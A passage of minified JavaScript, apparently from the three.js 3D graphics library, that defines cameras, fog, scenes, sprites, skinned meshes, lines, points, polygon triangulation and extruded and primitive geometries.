this.constructor(this.geometry,this.material)).copy(this)}});Ib.prototype=Object.create(T.prototype);Ib.prototype.constructor=Ib;kb.prototype=Object.create(I.prototype);kb.prototype.constructor=kb;Ac.prototype=Object.create(T.prototype);Ac.prototype.constructor=Ac;lb.prototype=Object.create(I.prototype);lb.prototype.constructor=lb;ra.prototype=Object.create(x.prototype);ra.prototype.constructor=ra;ra.prototype.isCamera=\n!0;ra.prototype.getWorldDirection=function(){var a=new ca;return function(b){b=b||new q;this.getWorldQuaternion(a);return b.set(0,0,-1).applyQuaternion(a)}}();ra.prototype.lookAt=function(){var a=new S;return function(b){a.lookAt(this.position,b,this.up);this.quaternion.setFromRotationMatrix(a)}}();ra.prototype.clone=function(){return(new this.constructor).copy(this)};ra.prototype.copy=function(a){x.prototype.copy.call(this,a);this.matrixWorldInverse.copy(a.matrixWorldInverse);this.projectionMatrix.copy(a.projectionMatrix);\nreturn this};Fa.prototype=Object.assign(Object.create(ra.prototype),{constructor:Fa,isPerspectiveCamera:!0,copy:function(a){ra.prototype.copy.call(this,a);this.fov=a.fov;this.zoom=a.zoom;this.near=a.near;this.far=a.far;this.focus=a.focus;this.aspect=a.aspect;this.view=null===a.view?null:Object.assign({},a.view);this.filmGauge=a.filmGauge;this.filmOffset=a.filmOffset;return this},setFocalLength:function(a){a=.5*this.getFilmHeight()/a;this.fov=2*N.RAD2DEG*Math.atan(a);this.updateProjectionMatrix()},\ngetFocalLength:function(){var a=Math.tan(.5*N.DEG2RAD*this.fov);return.5*this.getFilmHeight()/a},getEffectiveFOV:function(){return 2*N.RAD2DEG*Math.atan(Math.tan(.5*N.DEG2RAD*this.fov)/this.zoom)},getFilmWidth:function(){return this.filmGauge*Math.min(this.aspect,1)},getFilmHeight:function(){return this.filmGauge/Math.max(this.aspect,1)},setViewOffset:function(a,b,c,d,e,f){this.aspect=a/b;this.view={fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,width:e,height:f};this.updateProjectionMatrix()},clearViewOffset:function(){this.view=\nnull;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var a=this.near,b=a*Math.tan(.5*N.DEG2RAD*this.fov)/this.zoom,c=2*b,d=this.aspect*c,e=-.5*d,f=this.view;if(null!==f)var g=f.fullWidth,h=f.fullHeight,e=e+f.offsetX*d/g,b=b-f.offsetY*c/h,d=f.width/g*d,c=f.height/h*c;f=this.filmOffset;0!==f&&(e+=a*f/this.getFilmWidth());this.projectionMatrix.makePerspective(e,e+d,b,b-c,a,this.far)},toJSON:function(a){a=x.prototype.toJSON.call(this,a);a.object.fov=this.fov;a.object.zoom=this.zoom;a.object.near=\nthis.near;a.object.far=this.far;a.object.focus=this.focus;a.object.aspect=this.aspect;null!==this.view&&(a.object.view=Object.assign({},this.view));a.object.filmGauge=this.filmGauge;a.object.filmOffset=this.filmOffset;return a}});Jb.prototype=Object.assign(Object.create(ra.prototype),{constructor:Jb,isOrthographicCamera:!0,copy:function(a){ra.prototype.copy.call(this,a);this.left=a.left;this.right=a.right;this.top=a.top;this.bottom=a.bottom;this.near=a.near;this.far=a.far;this.zoom=a.zoom;this.view=\nnull===a.view?null:Object.assign({},a.view);return this},setViewOffset:function(a,b,c,d,e,f){this.view={fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,width:e,height:f};this.updateProjectionMatrix()},clearViewOffset:function(){this.view=null;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var a=(this.right-this.left)/(2*this.zoom),b=(this.top-this.bottom)/(2*this.zoom),c=(this.right+this.left)/2,d=(this.top+this.bottom)/2,e=c-a,c=c+a,a=d+b,b=d-b;if(null!==this.view)var c=this.zoom/\n(this.view.width/this.view.fullWidth),b=this.zoom/(this.view.height/this.view.fullHeight),f=(this.right-this.left)/this.view.width,d=(this.top-this.bottom)/this.view.height,e=e+this.view.offsetX/c*f,c=e+this.view.width/c*f,a=a-this.view.offsetY/b*d,b=a-this.view.height/b*d;this.projectionMatrix.makeOrthographic(e,c,a,b,this.near,this.far)},toJSON:function(a){a=x.prototype.toJSON.call(this,a);a.object.zoom=this.zoom;a.object.left=this.left;a.object.right=this.right;a.object.top=this.top;a.object.bottom=\nthis.bottom;a.object.near=this.near;a.object.far=this.far;null!==this.view&&(a.object.view=Object.assign({},this.view));return a}});var Lf=0;Kb.prototype.isFogExp2=!0;Kb.prototype.clone=function(){return new Kb(this.color.getHex(),this.density)};Kb.prototype.toJSON=function(a){return{type:\"FogExp2\",color:this.color.getHex(),density:this.density}};Lb.prototype.isFog=!0;Lb.prototype.clone=function(){return new Lb(this.color.getHex(),this.near,this.far)};Lb.prototype.toJSON=function(a){return{type:\"Fog\",\ncolor:this.color.getHex(),near:this.near,far:this.far}};mb.prototype=Object.create(x.prototype);mb.prototype.constructor=mb;mb.prototype.copy=function(a,b){x.prototype.copy.call(this,a,b);null!==a.background&&(this.background=a.background.clone());null!==a.fog&&(this.fog=a.fog.clone());null!==a.overrideMaterial&&(this.overrideMaterial=a.overrideMaterial.clone());this.autoUpdate=a.autoUpdate;this.matrixAutoUpdate=a.matrixAutoUpdate;return this};mb.prototype.toJSON=function(a){var b=x.prototype.toJSON.call(this,\na);null!==this.background&&(b.object.background=this.background.toJSON(a));null!==this.fog&&(b.object.fog=this.fog.toJSON());return b};Zd.prototype=Object.assign(Object.create(x.prototype),{constructor:Zd,isLensFlare:!0,copy:function(a){x.prototype.copy.call(this,a);this.positionScreen.copy(a.positionScreen);this.customUpdateCallback=a.customUpdateCallback;for(var b=0,c=a.lensFlares.length;b<c;b++)this.lensFlares.push(a.lensFlares[b]);return this},add:function(a,b,c,d,e,f){void 0===b&&(b=-1);void 0===\nc&&(c=0);void 0===f&&(f=1);void 0===e&&(e=new J(16777215));void 0===d&&(d=1);c=Math.min(c,Math.max(0,c));this.lensFlares.push({texture:a,size:b,distance:c,x:0,y:0,z:0,scale:1,rotation:0,opacity:f,color:e,blending:d})},updateLensFlares:function(){var a,b=this.lensFlares.length,c,d=2*-this.positionScreen.x,e=2*-this.positionScreen.y;for(a=0;a<b;a++)c=this.lensFlares[a],c.x=this.positionScreen.x+d*c.distance,c.y=this.positionScreen.y+e*c.distance,c.wantedRotation=c.x*Math.PI*.25,c.rotation+=.25*(c.wantedRotation-\nc.rotation)}});nb.prototype=Object.create(X.prototype);nb.prototype.constructor=nb;nb.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.rotation=a.rotation;return this};Dc.prototype=Object.assign(Object.create(x.prototype),{constructor:Dc,isSprite:!0,raycast:function(){var a=new q;return function(b,c){a.setFromMatrixPosition(this.matrixWorld);var d=b.ray.distanceSqToPoint(a);d>this.scale.x*this.scale.y/4||c.push({distance:Math.sqrt(d),point:this.position,\nface:null,object:this})}}(),clone:function(){return(new this.constructor(this.material)).copy(this)}});Ec.prototype=Object.assign(Object.create(x.prototype),{constructor:Ec,copy:function(a){x.prototype.copy.call(this,a,!1);a=a.levels;for(var b=0,c=a.length;b<c;b++){var d=a[b];this.addLevel(d.object.clone(),d.distance)}return this},addLevel:function(a,b){void 0===b&&(b=0);b=Math.abs(b);for(var c=this.levels,d=0;d<c.length&&!(b<c[d].distance);d++);c.splice(d,0,{distance:b,object:a});this.add(a)},getObjectForDistance:function(a){for(var b=\nthis.levels,c=1,d=b.length;c<d&&!(a<b[c].distance);c++);return b[c-1].object},raycast:function(){var a=new q;return function(b,c){a.setFromMatrixPosition(this.matrixWorld);var d=b.ray.origin.distanceTo(a);this.getObjectForDistance(d).raycast(b,c)}}(),update:function(){var a=new q,b=new q;return function(c){var d=this.levels;if(1<d.length){a.setFromMatrixPosition(c.matrixWorld);b.setFromMatrixPosition(this.matrixWorld);c=a.distanceTo(b);d[0].object.visible=!0;for(var e=1,f=d.length;e<f;e++)if(c>=d[e].distance)d[e-\n1].object.visible=!1,d[e].object.visible=!0;else break;for(;e<f;e++)d[e].object.visible=!1}}}(),toJSON:function(a){a=x.prototype.toJSON.call(this,a);a.object.levels=[];for(var b=this.levels,c=0,d=b.length;c<d;c++){var e=b[c];a.object.levels.push({object:e.object.uuid,distance:e.distance})}return a}});Object.assign(od.prototype,{calculateInverses:function(){this.boneInverses=[];for(var a=0,b=this.bones.length;a<b;a++){var c=new S;this.bones[a]&&c.getInverse(this.bones[a].matrixWorld);this.boneInverses.push(c)}},\npose:function(){for(var a,b=0,c=this.bones.length;b<c;b++)(a=this.bones[b])&&a.matrixWorld.getInverse(this.boneInverses[b]);b=0;for(c=this.bones.length;b<c;b++)if(a=this.bones[b])a.parent&&a.parent.isBone?(a.matrix.getInverse(a.parent.matrixWorld),a.matrix.multiply(a.matrixWorld)):a.matrix.copy(a.matrixWorld),a.matrix.decompose(a.position,a.quaternion,a.scale)},update:function(){var a=new S;return function(){for(var b=0,c=this.bones.length;b<c;b++)a.multiplyMatrices(this.bones[b]?this.bones[b].matrixWorld:\nthis.identityMatrix,this.boneInverses[b]),a.toArray(this.boneMatrices,16*b);this.useVertexTexture&&(this.boneTexture.needsUpdate=!0)}}(),clone:function(){return new od(this.bones,this.boneInverses,this.useVertexTexture)}});pd.prototype=Object.assign(Object.create(x.prototype),{constructor:pd,isBone:!0});qd.prototype=Object.assign(Object.create(Aa.prototype),{constructor:qd,isSkinnedMesh:!0,bind:function(a,b){this.skeleton=a;void 0===b&&(this.updateMatrixWorld(!0),this.skeleton.calculateInverses(),\nb=this.matrixWorld);this.bindMatrix.copy(b);this.bindMatrixInverse.getInverse(b)},pose:function(){this.skeleton.pose()},normalizeSkinWeights:function(){if(this.geometry&&this.geometry.isGeometry)for(var a=0;a<this.geometry.skinWeights.length;a++){var b=this.geometry.skinWeights[a],c=1/b.lengthManhattan();Infinity!==c?b.multiplyScalar(c):b.set(1,0,0,0)}else if(this.geometry&&this.geometry.isBufferGeometry)for(var b=new fa,d=this.geometry.attributes.skinWeight,a=0;a<d.count;a++)b.x=d.getX(a),b.y=d.getY(a),\nb.z=d.getZ(a),b.w=d.getW(a),c=1/b.lengthManhattan(),Infinity!==c?b.multiplyScalar(c):b.set(1,0,0,0),d.setXYZW(a,b.x,b.y,b.z,b.w)},updateMatrixWorld:function(a){Aa.prototype.updateMatrixWorld.call(this,!0);\"attached\"===this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):\"detached\"===this.bindMode?this.bindMatrixInverse.getInverse(this.bindMatrix):console.warn(\"THREE.SkinnedMesh unrecognized bindMode: \"+this.bindMode)},clone:function(){return(new this.constructor(this.geometry,this.material,\nthis.skeleton.useVertexTexture)).copy(this)}});ia.prototype=Object.create(X.prototype);ia.prototype.constructor=ia;ia.prototype.isLineBasicMaterial=!0;ia.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.linecap=a.linecap;this.linejoin=a.linejoin;return this};Ua.prototype=Object.assign(Object.create(x.prototype),{constructor:Ua,isLine:!0,raycast:function(){var a=new S,b=new cb,c=new Na;return function(d,e){var f=d.linePrecision,f=f*f,\ng=this.geometry,h=this.matrixWorld;null===g.boundingSphere&&g.computeBoundingSphere();c.copy(g.boundingSphere);c.applyMatrix4(h);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(h);b.copy(d.ray).applyMatrix4(a);var m=new q,k=new q,h=new q,l=new q,p=this&&this.isLineSegments?2:1;if(g.isBufferGeometry){var n=g.index,u=g.attributes.position.array;if(null!==n)for(var n=n.array,g=0,G=n.length-1;g<G;g+=p){var r=n[g+1];m.fromArray(u,3*n[g]);k.fromArray(u,3*r);r=b.distanceSqToSegment(m,k,l,h);r>f||(l.applyMatrix4(this.matrixWorld),\nr=d.ray.origin.distanceTo(l),r<d.near||r>d.far||e.push({distance:r,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else for(g=0,G=u.length/3-1;g<G;g+=p)m.fromArray(u,3*g),k.fromArray(u,3*g+3),r=b.distanceSqToSegment(m,k,l,h),r>f||(l.applyMatrix4(this.matrixWorld),r=d.ray.origin.distanceTo(l),r<d.near||r>d.far||e.push({distance:r,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else if(g.isGeometry)for(m=g.vertices,\nk=m.length,g=0;g<k-1;g+=p)r=b.distanceSqToSegment(m[g],m[g+1],l,h),r>f||(l.applyMatrix4(this.matrixWorld),r=d.ray.origin.distanceTo(l),r<d.near||r>d.far||e.push({distance:r,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});ga.prototype=Object.assign(Object.create(Ua.prototype),{constructor:ga,isLineSegments:!0});Oa.prototype=Object.create(X.prototype);Oa.prototype.constructor=\nOa;Oa.prototype.isPointsMaterial=!0;Oa.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.size=a.size;this.sizeAttenuation=a.sizeAttenuation;return this};Mb.prototype=Object.assign(Object.create(x.prototype),{constructor:Mb,isPoints:!0,raycast:function(){var a=new S,b=new cb,c=new Na;return function(d,e){function f(a,c){var f=b.distanceSqToPoint(a);if(f<l){var h=b.closestPointToPoint(a);h.applyMatrix4(m);var k=d.ray.origin.distanceTo(h);k<d.near||\nk>d.far||e.push({distance:k,distanceToRay:Math.sqrt(f),point:h.clone(),index:c,face:null,object:g})}}var g=this,h=this.geometry,m=this.matrixWorld,k=d.params.Points.threshold;null===h.boundingSphere&&h.computeBoundingSphere();c.copy(h.boundingSphere);c.applyMatrix4(m);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(m);b.copy(d.ray).applyMatrix4(a);var k=k/((this.scale.x+this.scale.y+this.scale.z)/3),l=k*k,k=new q;if(h.isBufferGeometry){var p=h.index,h=h.attributes.position.array;if(null!==p)for(var n=\np.array,p=0,u=n.length;p<u;p++){var G=n[p];k.fromArray(h,3*G);f(k,G)}else for(p=0,n=h.length/3;p<n;p++)k.fromArray(h,3*p),f(k,p)}else for(k=h.vertices,p=0,n=k.length;p<n;p++)f(k[p],p)}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});Fc.prototype=Object.assign(Object.create(x.prototype),{constructor:Fc});rd.prototype=Object.create(ea.prototype);rd.prototype.constructor=rd;Nb.prototype=Object.create(ea.prototype);Nb.prototype.constructor=Nb;Nb.prototype.isCompressedTexture=\n!0;sd.prototype=Object.create(ea.prototype);sd.prototype.constructor=sd;Gc.prototype=Object.create(ea.prototype);Gc.prototype.constructor=Gc;Gc.prototype.isDepthTexture=!0;Ob.prototype=Object.create(I.prototype);Ob.prototype.constructor=Ob;Hc.prototype=Object.create(T.prototype);Hc.prototype.constructor=Hc;Pb.prototype=Object.create(I.prototype);Pb.prototype.constructor=Pb;Ic.prototype=Object.create(T.prototype);Ic.prototype.constructor=Ic;Ba.prototype=Object.create(I.prototype);Ba.prototype.constructor=\nBa;Jc.prototype=Object.create(T.prototype);Jc.prototype.constructor=Jc;Qb.prototype=Object.create(Ba.prototype);Qb.prototype.constructor=Qb;Kc.prototype=Object.create(T.prototype);Kc.prototype.constructor=Kc;ob.prototype=Object.create(Ba.prototype);ob.prototype.constructor=ob;Lc.prototype=Object.create(T.prototype);Lc.prototype.constructor=Lc;Rb.prototype=Object.create(Ba.prototype);Rb.prototype.constructor=Rb;Mc.prototype=Object.create(T.prototype);Mc.prototype.constructor=Mc;Sb.prototype=Object.create(Ba.prototype);\nSb.prototype.constructor=Sb;Nc.prototype=Object.create(T.prototype);Nc.prototype.constructor=Nc;Tb.prototype=Object.create(I.prototype);Tb.prototype.constructor=Tb;Oc.prototype=Object.create(T.prototype);Oc.prototype.constructor=Oc;Ub.prototype=Object.create(I.prototype);Ub.prototype.constructor=Ub;Pc.prototype=Object.create(T.prototype);Pc.prototype.constructor=Pc;Vb.prototype=Object.create(I.prototype);Vb.prototype.constructor=Vb;var Ia={area:function(a){for(var b=a.length,c=0,d=b-1,e=0;e<b;d=e++)c+=\na[d].x*a[e].y-a[e].x*a[d].y;return.5*c},triangulate:function(){return function(a,b){var c=a.length;if(3>c)return null;var d=[],e=[],f=[],g,h,m;if(0<Ia.area(a))for(h=0;h<c;h++)e[h]=h;else for(h=0;h<c;h++)e[h]=c-1-h;var k=2*c;for(h=c-1;2<c;){if(0>=k--){console.warn(\"THREE.ShapeUtils: Unable to triangulate polygon! in triangulate()\");break}g=h;c<=g&&(g=0);h=g+1;c<=h&&(h=0);m=h+1;c<=m&&(m=0);var l;a:{var p,n,q,G,r,A,w,y;p=a[e[g]].x;n=a[e[g]].y;q=a[e[h]].x;G=a[e[h]].y;r=a[e[m]].x;A=a[e[m]].y;if(0>=(q-\np)*(A-n)-(G-n)*(r-p))l=!1;else{var K,v,E,x,C,F,D,H,z,J;K=r-q;v=A-G;E=p-r;x=n-A;C=q-p;F=G-n;for(l=0;l<c;l++)if(w=a[e[l]].x,y=a[e[l]].y,!(w===p&&y===n||w===q&&y===G||w===r&&y===A)&&(D=w-p,H=y-n,z=w-q,J=y-G,w-=r,y-=A,z=K*J-v*z,D=C*H-F*D,H=E*y-x*w,z>=-Number.EPSILON&&H>=-Number.EPSILON&&D>=-Number.EPSILON)){l=!1;break a}l=!0}}if(l){d.push([a[e[g]],a[e[h]],a[e[m]]]);f.push([e[g],e[h],e[m]]);g=h;for(m=h+1;m<c;g++,m++)e[g]=e[m];c--;k=2*c}}return b?f:d}}(),triangulateShape:function(a,b){function c(a){var b=\na.length;2<b&&a[b-1].equals(a[0])&&a.pop()}function d(a,b,c){return a.x!==b.x?a.x<b.x?a.x<=c.x&&c.x<=b.x:b.x<=c.x&&c.x<=a.x:a.y<b.y?a.y<=c.y&&c.y<=b.y:b.y<=c.y&&c.y<=a.y}function e(a,b,c,e,f){var g=b.x-a.x,h=b.y-a.y,k=e.x-c.x,m=e.y-c.y,l=a.x-c.x,n=a.y-c.y,p=h*k-g*m,t=h*l-g*n;if(Math.abs(p)>Number.EPSILON){if(0<p){if(0>t||t>p)return[];k=m*l-k*n;if(0>k||k>p)return[]}else{if(0<t||t<p)return[];k=m*l-k*n;if(0<k||k<p)return[]}if(0===k)return!f||0!==t&&t!==p?[a]:[];if(k===p)return!f||0!==t&&t!==p?[b]:[];\nif(0===t)return[c];if(t===p)return[e];f=k/p;return[{x:a.x+f*g,y:a.y+f*h}]}if(0!==t||m*l!==k*n)return[];h=0===g&&0===h;k=0===k&&0===m;if(h&&k)return a.x!==c.x||a.y!==c.y?[]:[a];if(h)return d(c,e,a)?[a]:[];if(k)return d(a,b,c)?[c]:[];0!==g?(a.x<b.x?(g=a,k=a.x,h=b,a=b.x):(g=b,k=b.x,h=a,a=a.x),c.x<e.x?(b=c,p=c.x,m=e,c=e.x):(b=e,p=e.x,m=c,c=c.x)):(a.y<b.y?(g=a,k=a.y,h=b,a=b.y):(g=b,k=b.y,h=a,a=a.y),c.y<e.y?(b=c,p=c.y,m=e,c=e.y):(b=e,p=e.y,m=c,c=c.y));return k<=p?a<p?[]:a===p?f?[]:[b]:a<=c?[b,h]:[b,m]:\nk>c?[]:k===c?f?[]:[g]:a<=c?[g,h]:[g,m]}function f(a,b,c,d){var e=b.x-a.x,f=b.y-a.y;b=c.x-a.x;c=c.y-a.y;var g=d.x-a.x;d=d.y-a.y;a=e*c-f*b;e=e*d-f*g;return Math.abs(a)>Number.EPSILON?(b=g*c-d*b,0<a?0<=e&&0<=b:0<=e||0<=b):0<e}c(a);b.forEach(c);var g,h,m,k,l,p={};m=a.concat();g=0;for(h=b.length;g<h;g++)Array.prototype.push.apply(m,b[g]);g=0;for(h=m.length;g<h;g++)l=m[g].x+\":\"+m[g].y,void 0!==p[l]&&console.warn(\"THREE.ShapeUtils: Duplicate point\",l,g),p[l]=g;g=function(a,b){function c(a,b){var d=h.length-\n1,e=a-1;0>e&&(e=d);var g=a+1;g>d&&(g=0);d=f(h[a],h[e],h[g],k[b]);if(!d)return!1;d=k.length-1;e=b-1;0>e&&(e=d);g=b+1;g>d&&(g=0);return(d=f(k[b],k[e],k[g],h[a]))?!0:!1}function d(a,b){var c,f;for(c=0;c<h.length;c++)if(f=c+1,f%=h.length,f=e(a,b,h[c],h[f],!0),0<f.length)return!0;return!1}function g(a,c){var d,f,h,k;for(d=0;d<m.length;d++)for(f=b[m[d]],h=0;h<f.length;h++)if(k=h+1,k%=f.length,k=e(a,c,f[h],f[k],!0),0<k.length)return!0;return!1}var h=a.concat(),k,m=[],l,n,p,t,q,x=[],D,z,J,I=0;for(l=b.length;I<\nl;I++)m.push(I);D=0;for(var Q=2*m.length;0<m.length;){Q--;if(0>Q){console.log(\"Infinite Loop! Holes left:\"+m.length+\", Probably Hole outside Shape!\");break}for(n=D;n<h.length;n++){p=h[n];l=-1;for(I=0;I<m.length;I++)if(t=m[I],q=p.x+\":\"+p.y+\":\"+t,void 0===x[q]){k=b[t];for(z=0;z<k.length;z++)if(t=k[z],c(n,z)&&!d(p,t)&&!g(p,t)){l=z;m.splice(I,1);D=h.slice(0,n+1);t=h.slice(n);z=k.slice(l);J=k.slice(0,l+1);h=D.concat(z).concat(J).concat(t);D=n;break}if(0<=l)break;x[q]=!0}if(0<=l)break}}return h}(a,b);var n=\nIa.triangulate(g,!1);g=0;for(h=n.length;g<h;g++)for(k=n[g],m=0;3>m;m++)l=k[m].x+\":\"+k[m].y,l=p[l],void 0!==l&&(k[m]=l);return n.concat()},isClockWise:function(a){return 0>Ia.area(a)}};La.prototype=Object.create(T.prototype);La.prototype.constructor=La;La.prototype.addShapeList=function(a,b){for(var c=a.length,d=0;d<c;d++)this.addShape(a[d],b)};La.prototype.addShape=function(a,b){function c(a,b,c){b||console.error(\"THREE.ExtrudeGeometry: vec does not exist\");return b.clone().multiplyScalar(c).add(a)}\nfunction d(a,b,c){var d,e,f;e=a.x-b.x;f=a.y-b.y;d=c.x-a.x;var g=c.y-a.y,h=e*e+f*f;if(Math.abs(e*g-f*d)>Number.EPSILON){var k=Math.sqrt(h),m=Math.sqrt(d*d+g*g),h=b.x-f/k;b=b.y+e/k;g=((c.x-g/m-h)*g-(c.y+d/m-b)*d)/(e*g-f*d);d=h+e*g-a.x;e=b+f*g-a.y;f=d*d+e*e;if(2>=f)return new D(d,e);f=Math.sqrt(f/2)}else a=!1,e>Number.EPSILON?d>Number.EPSILON&&(a=!0):e<-Number.EPSILON?d<-Number.EPSILON&&(a=!0):Math.sign(f)===Math.sign(g)&&(a=!0),a?(d=-f,f=Math.sqrt(h)):(d=e,e=f,f=Math.sqrt(h/2));return new D(d/f,e/f)}\nfunction e(a,b){var c,d;for(R=a.length;0<=--R;){c=R;d=R-1;0>d&&(d=a.length-1);var e,f=u+2*l;for(e=0;e<f;e++){var g=U*e,h=U*(e+1),k=b+c+g,g=b+d+g,m=b+d+h,h=b+c+h,k=k+H,g=g+H,m=m+H,h=h+H;J.faces.push(new ha(k,g,h,null,null,1));J.faces.push(new ha(g,m,h,null,null,1));k=w.generateSideWallUV(J,k,g,m,h);J.faceVertexUvs[0].push([k[0],k[1],k[3]]);J.faceVertexUvs[0].push([k[1],k[2],k[3]])}}}function f(a,b,c){J.vertices.push(new q(a,b,c))}function g(a,b,c){a+=H;b+=H;c+=H;J.faces.push(new ha(a,b,c,null,null,\n0));a=w.generateTopUV(J,a,b,c);J.faceVertexUvs[0].push(a)}var h=void 0!==b.amount?b.amount:100,m=void 0!==b.bevelThickness?b.bevelThickness:6,k=void 0!==b.bevelSize?b.bevelSize:m-2,l=void 0!==b.bevelSegments?b.bevelSegments:3,p=void 0!==b.bevelEnabled?b.bevelEnabled:!0,n=void 0!==b.curveSegments?b.curveSegments:12,u=void 0!==b.steps?b.steps:1,G=b.extrudePath,r,A=!1,w=void 0!==b.UVGenerator?b.UVGenerator:La.WorldUVGenerator,y,x,v,E;G&&(r=G.getSpacedPoints(u),A=!0,p=!1,y=void 0!==b.frames?b.frames:\nG.computeFrenetFrames(u,!1),x=new q,v=new q,E=new q);p||(k=m=l=0);var z,C,F,J=this,H=this.vertices.length,G=a.extractPoints(n),n=G.shape,I=G.holes;if(G=!Ia.isClockWise(n)){n=n.reverse();C=0;for(F=I.length;C<F;C++)z=I[C],Ia.isClockWise(z)&&(I[C]=z.reverse());G=!1}var T=Ia.triangulateShape(n,I),S=n;C=0;for(F=I.length;C<F;C++)z=I[C],n=n.concat(z);var N,Q,M,O,P,U=n.length,W,V=T.length,G=[],R=0;M=S.length;N=M-1;for(Q=R+1;R<M;R++,N++,Q++)N===M&&(N=0),Q===M&&(Q=0),G[R]=d(S[R],S[N],S[Q]);var X=[],Z,ca=G.concat();\nC=0;for(F=I.length;C<F;C++){z=I[C];Z=[];R=0;M=z.length;N=M-1;for(Q=R+1;R<M;R++,N++,Q++)N===M&&(N=0),Q===M&&(Q=0),Z[R]=d(z[R],z[N],z[Q]);X.push(Z);ca=ca.concat(Z)}for(N=0;N<l;N++){M=N/l;O=m*Math.cos(M*Math.PI/2);Q=k*Math.sin(M*Math.PI/2);R=0;for(M=S.length;R<M;R++)P=c(S[R],G[R],Q),f(P.x,P.y,-O);C=0;for(F=I.length;C<F;C++)for(z=I[C],Z=X[C],R=0,M=z.length;R<M;R++)P=c(z[R],Z[R],Q),f(P.x,P.y,-O)}Q=k;for(R=0;R<U;R++)P=p?c(n[R],ca[R],Q):n[R],A?(v.copy(y.normals[0]).multiplyScalar(P.x),x.copy(y.binormals[0]).multiplyScalar(P.y),\nE.copy(r[0]).add(v).add(x),f(E.x,E.y,E.z)):f(P.x,P.y,0);for(M=1;M<=u;M++)for(R=0;R<U;R++)P=p?c(n[R],ca[R],Q):n[R],A?(v.copy(y.normals[M]).multiplyScalar(P.x),x.copy(y.binormals[M]).multiplyScalar(P.y),E.copy(r[M]).add(v).add(x),f(E.x,E.y,E.z)):f(P.x,P.y,h/u*M);for(N=l-1;0<=N;N--){M=N/l;O=m*Math.cos(M*Math.PI/2);Q=k*Math.sin(M*Math.PI/2);R=0;for(M=S.length;R<M;R++)P=c(S[R],G[R],Q),f(P.x,P.y,h+O);C=0;for(F=I.length;C<F;C++)for(z=I[C],Z=X[C],R=0,M=z.length;R<M;R++)P=c(z[R],Z[R],Q),A?f(P.x,P.y+r[u-1].y,\nr[u-1].x+O):f(P.x,P.y,h+O)}(function(){if(p){var a=0*U;for(R=0;R<V;R++)W=T[R],g(W[2]+a,W[1]+a,W[0]+a);a=U*(u+2*l);for(R=0;R<V;R++)W=T[R],g(W[0]+a,W[1]+a,W[2]+a)}else{for(R=0;R<V;R++)W=T[R],g(W[2],W[1],W[0]);for(R=0;R<V;R++)W=T[R],g(W[0]+U*u,W[1]+U*u,W[2]+U*u)}})();(function(){var a=0;e(S,a);a+=S.length;C=0;for(F=I.length;C<F;C++)z=I[C],e(z,a),a+=z.length})()};La.WorldUVGenerator={generateTopUV:function(a,b,c,d){a=a.vertices;b=a[b];c=a[c];d=a[d];return[new D(b.x,b.y),new D(c.x,c.y),new D(d.x,d.y)]},\ngenerateSideWallUV:function(a,b,c,d,e){a=a.vertices;b=a[b];c=a[c];d=a[d];e=a[e];return.01>Math.abs(b.y-c.y)?[new D(b.x,1-b.z),new D(c.x,1-c.z),new D(d.x,1-d.z),new D(e.x,1-e.z)]:[new D(b.y,1-b.z),new D(c.y,1-c.z),new D(d.y,1-d.z),new D(e.y,1-e.z)]}};Qc.prototype=Object.create(La.prototype);Qc.prototype.constructor=Qc;Rc.prototype=Object.create(T.prototype);Rc.prototype.constructor=Rc;pb.prototype=Object.create(I.prototype);pb.prototype.constructor=pb;Sc.prototype=Object.create(T.prototype);Sc.prototype.constructor=\nSc;Wb.prototype=Object.create(I.prototype);Wb.prototype.constructor=Wb;Tc.prototype=Object.create(T.prototype);Tc.prototype.constructor=Tc;Xb.prototype=Object.create(I.prototype);Xb.prototype.constructor=Xb;Yb.prototype=Object.create(T.prototype);Yb.prototype.constructor=Yb;Zb.prototype=Object.create(I.prototype);Zb.prototype.constructor=Zb;$b.prototype=Object.create(I.prototype);$b.prototype.constructor=$b;qb.prototype=Object.create(T.prototype);qb.prototype.constructor=qb;Va.prototype=Object.create(I.prototype);\nVa.prototype.constructor=Va;Uc.prototype=Object.create(qb.prototype);Uc.prototype.constructor=Uc;Vc.prototype=Object.create(Va.prototype);Vc.prototype.constructor=Vc;Wc.prototype=Object.create(T.prototype);Wc.prototype.constructor=Wc;ac.prototype=Object.create(I.prototype);ac.prototype.constructor=ac;var Ma=Object.freeze({WireframeGeometry:Ob,ParametricGeometry:Hc,ParametricBufferGeometry:Pb,TetrahedronGeometry:Jc,TetrahedronBufferGeometry:Qb,OctahedronGeometry:Kc,OctahedronBufferGeometry:ob,IcosahedronGeometry:Lc,\nIcosahedronBufferGeometry:Rb,DodecahedronGeometry:Mc,DodecahedronBufferGeometry:Sb,PolyhedronGeometry:Ic,PolyhedronBufferGeometry:Ba,TubeGeometry:Nc,TubeBufferGeometry:Tb,TorusKnotGeometry:Oc,TorusKnotBufferGeometry:Ub,TorusGeometry:Pc,TorusBufferGeometry:Vb,TextGeometry:Qc,SphereGeometry:Rc,SphereBufferGeometry:pb,RingGeometry:Sc,RingBufferGeometry:Wb,PlaneGeometry:Ac,PlaneBufferGeometry:lb,LatheGeometry:Tc,LatheBufferGeometry:Xb,ShapeGeometry:Yb,ShapeBufferGeometry:Zb,ExtrudeGeometry:La,EdgesGeometry:$b,\nConeGeometry:Uc,ConeBufferGeometry:Vc,CylinderGeometry:qb,CylinderBufferGeometry:Va,CircleGeometry:Wc,CircleBufferGeometry:ac,BoxGeometry:Ib,BoxBufferGeometry:kb});bc.prototype=Object.create(Ha.prototype);bc.prototype.constructor=bc;bc.prototype.isShadowMaterial=!0;cc.prototype=Object.create(Ha.prototype);c